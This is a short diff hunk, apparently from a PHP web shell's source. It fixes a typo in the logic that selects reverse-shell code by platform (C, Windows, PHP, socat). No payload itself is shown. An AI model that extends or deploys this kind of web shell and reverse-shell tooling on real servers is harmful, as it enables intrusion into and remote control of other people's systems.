@@ -2056,7 +2056,7 @@ if($s_auth){
 				elseif($s_split[1]=="c") $s_rscode = $s_rs_c;
 				elseif($s_split[1]=="win") $s_rscode = $s_rs_win;
 				elseif($s_split[1]=="php") $s_rscode = $s_rs_php;
-				elseif($s_split[1]=="elf") $s_rscode = $s_rs_socat;;
+				elseif($s_split[1]=="elf") $s_rscode = $s_rs_socat;
 				$s_buff = rs($s_rstype,$s_rstarget_packed,$s_rscode);
 				if($s_buff!="") $s_rs_err = "<p class='notif'>".hss($s_buff)."</p>";
 			}
